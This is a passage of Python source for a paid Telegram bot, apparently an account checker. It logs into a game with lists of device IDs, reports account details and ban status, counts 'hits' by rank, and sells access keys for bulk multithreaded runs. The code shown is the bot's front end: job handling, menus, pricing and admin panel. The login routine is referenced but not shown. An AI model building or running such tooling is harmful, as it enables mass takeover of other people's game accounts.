# ════════════════════════════════════════════════════════════════
# HANDLERS
# ════════════════════════════════════════════════════════════════

async def handle_document(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
    with job_lock: wants = active_jobs.get(uid, {}).get("awaiting_bulk_file")
    if not wants:
        await update.message.reply_text("Use /start → 🔥 *Bulk Check* first.", parse_mode="Markdown"); return
    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Job already running."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file."); return
    f = await ctx.bot.get_file(doc.file_id); data = await f.download_as_bytearray()
    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]
    if not lines:
        await update.message.reply_text("No IDs found."); return
    threads = await user_manager.get_threads_limit(uid)
    pm = await update.message.reply_text(
        f"⚡  *LOADING BULK JOB*\n{LINE_HEAVY}\n"
        f"┣ 📦 IDs     : `{len(lines)}`\n"
        f"┗ 🧵 Threads : `{threads}`\n"
        f"{LINE_HEAVY}", parse_mode="Markdown")
    job = {"user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
           "devices": lines, "threads": threads,
           "username": update.effective_user.username or "",
           "first_name": update.effective_user.first_name or "",
           "stopped": False, "checked": 0, "total": len(lines),
           "started": time.time(), "status": "running"}
    with job_lock:
        active_jobs[uid] = job; active_jobs[uid].pop("awaiting_bulk_file", None)
    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    with job_lock: awaiting = active_jobs.get(uid, {}).get("awaiting_single_device")
    if not (awaiting and auth): return
    did = update.message.text.strip()
    with job_lock:
        active_jobs.get(uid, {}).pop("awaiting_single_device", None)
        if not active_jobs.get(uid): active_jobs.pop(uid, None)
    msg = await update.message.reply_text(
        f"🔍  *SINGLE CHECK*\n{LINE_HEAVY}\n`{did[:44]}`\n{LINE_HEAVY}",
        parse_mode="Markdown")
    acc, zone, st = await asyncio.to_thread(lambda: GameLogin(did).run())
    if not acc or not zone:
        await msg.edit_text(f"❌ Login failed: `{st}`", parse_mode="Markdown"); return
    ok, pd, _ = await asyncio.to_thread(process_detail, did, acc, zone, False)
    if not ok or not pd:
        await msg.edit_text(f"❌ Check failed for `{did[:44]}`", parse_mode="Markdown"); return
    pd['account_id'] = acc; pd['zone_id'] = zone
    card = render_card(did, pd)
    try:
        await msg.edit_text(card, parse_mode="Markdown")
    except Exception:
        await msg.edit_text(f"```\n{card}\n```")
    is_b = 'ban' in str(pd.get('ban_status','')).lower()
    await user_manager.update_stats(uid, checked=1, hits=0 if is_b else 1)

async def handle_callback(update, ctx):
    q = update.callback_query
    try: await q.answer()
    except: pass
    data = q.data; uid = update.effective_user.id

    if data == "verify_join":
        invalidate_membership(uid)
        ok, missing = await check_membership(ctx.bot, uid)
        if ok:
            await q.edit_message_text("✅ *Verified!* Tap /start.", parse_mode="Markdown")
        else:
            ml = "\n".join(f"  • {m}" for m in missing)
            await q.edit_message_text(f"⚠️ Still missing:\n{ml}", parse_mode="Markdown",
                                       reply_markup=kb_join_channels())
        return
    if uid != OWNER_ID:
        ok, _ = await check_membership(ctx.bot, uid)
        if not ok:
            await q.edit_message_text(render_join_gate(update.effective_user.first_name or "there"),
                parse_mode="Markdown", reply_markup=kb_join_channels()); return
    if data == "tool_bulk":
        auth, r = await user_manager.is_authorized(uid)
        if not auth:
            await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bulk_file"] = True
        await q.edit_message_text(
            f"📤  *BULK CHECK MODE*\n{LINE_HEAVY}\n"
            "Send a `.txt` file — one Device ID per line.\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return
    if data == "tool_single":
        auth, r = await user_manager.is_authorized(uid)
        if not auth:
            await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_single_device"] = True
        await q.edit_message_text(
            f"🔍  *SINGLE CHECK MODE*\n{LINE_HEAVY}\n"
            "Send the Device ID as text.\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return
    if data == "tool_stats":
        with COUNTER_LOCK:
            lines = [f"◇  *RANK HITS*  ◇\n{LINE_HEAVY}"]
            for r in ['warrior','elite','master','gm','epic','legend','mythic']:
                lines.append(f"┣ {r.capitalize():<10}: `{HIT_COUNTERS.get(r,0)}`")
            lines.append(f"┗ 👑 Sultan  : `{HIT_COUNTERS.get('sultan',0)}`")
            lines.append(LINE_HEAVY)
            lines.append(f"👑 {BRAND}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return
    if data == "menu_buy":
        await q.edit_message_text(
            f"💳  *GET ACCESS*\n{LINE_HEAVY}\n"
            "┣ 3 Days     · ₱50\n"
            "┣ 7 Days     · ₱70\n"
            "┣ 1 Month    · ₱100\n"
            "┗ Lifetime   · ₱150\n"
            f"{LINE_HEAVY}\n📩 {BRAND}", parse_mode="Markdown"); return
    if data == "menu_help":
        await q.edit_message_text(
            f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
            "┣ 🔥 Bulk Check\n┣ 🔍 Single Check\n"
            "┣ 📊 Stats\n┗ 📖 Menu\n\n"
            "`/redeem` · `/start` · `/stop`\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return
    if data.startswith("stop_"):
        target = int(data.split("_")[1])
        if uid == target or uid == OWNER_ID:
            with job_lock:
                if target in active_jobs: active_jobs[target]["stopped"] = True
            await q.edit_message_text("🛑 Stopped.")
        return
    if data == "open_admin_panel":
        if uid != OWNER_ID: await q.answer("Admin only", show_alert=True); return
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
             InlineKeyboardButton("👥 Users", callback_data="adm_users")],
            [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
             InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast_help")]])
        await q.edit_message_text(f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}",
            reply_markup=kb, parse_mode="Markdown"); return
    if data == "adm_running":
        if uid != OWNER_ID: return
        with job_lock:
            running = [(k, dict(v)) for k, v in active_jobs.items()
                       if v.get("status") == "running" and "stats" in v]
        if not running:
            await q.edit_message_text("No active jobs."); return
        lines = [f"⚡ *RUNNING — {len(running)}*\n{LINE_HEAVY}"]
        for r_uid, rj in running:
            s = rj["stats"].snapshot()
            lines.append(f"`{r_uid}` — ✅{s['hits']} 🚫{s['banned']} ❌{s['failed']} ({s['checked']}/{s['total']})")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return
    if data == "adm_stats":
        if uid != OWNER_ID: return
        await cmd_stats(update, ctx); return
    if data == "adm_users":
        if uid != OWNER_ID: return
        users = await user_manager.get_all_users()
        lines = [f"👥 *Users ({len(users)})*", LINE_HEAVY]
        for u, i in list(users.items())[:30]:
            lines.append(f"`{u}` | exp={(i.get('key_expiry') or '—')[:10]}")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return
    if data == "adm_genkey":
        if uid != OWNER_ID: return
        await q.edit_message_text("Use `/genkey hours 24 1`", parse_mode="Markdown"); return
    if data == "adm_broadcast_help":
        if uid != OWNER_ID: return
        await q.edit_message_text("Use `/broadcast your message`", parse_mode="Markdown"); return

# ════════════════════════════════════════════════════════════════
# POST_INIT + MAIN
# ════════════════════════════════════════════════════════════════

async def post_init(app):
    cmds = [
        BotCommand("start", "Dashboard"), BotCommand("menu", "Show menu"),
        BotCommand("redeem", "Redeem key"), BotCommand("stop", "Stop job"),
        BotCommand("status", "Status"), BotCommand("help", "Help"),
    ]
    await app.bot.set_my_commands(cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(cmds + [
            BotCommand("admin", "Admin panel"),
            BotCommand("genkey", "Generate key"),
            BotCommand("ban_user", "Ban user"),
            BotCommand("unban_user", "Unban user"),
            BotCommand("stats", "Statistics"),
            BotCommand("broadcast", "Broadcast"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})
    log.info(f"🚀 {BOT_NAME} v{BOT_VERSION} online")

def main():
    req = HTTPXRequest(connect_timeout=TELEGRAM_CONNECT_TIMEOUT, read_timeout=TELEGRAM_READ_TIMEOUT,
                      write_timeout=TELEGRAM_WRITE_TIMEOUT, pool_timeout=TELEGRAM_POOL_TIMEOUT)
    app = Application.builder().token(BOT_TOKEN).request(req).post_init(post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("ban_user", cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))
    log.info("🔥 Starting SHIN Cyber Edition...")
    try:
        app.run_polling(bootstrap_retries=10, allowed_updates=Update.ALL_TYPES, drop_pending_updates=False)
    except NetworkError as e:
        log.error(f"Network: {e}. Retry in 5s..."); time.sleep(5); main()
    except Exception as e:
        log.error(f"Fatal: {e}"); sys.exit(1)

if __name__ == "__main__":
    main()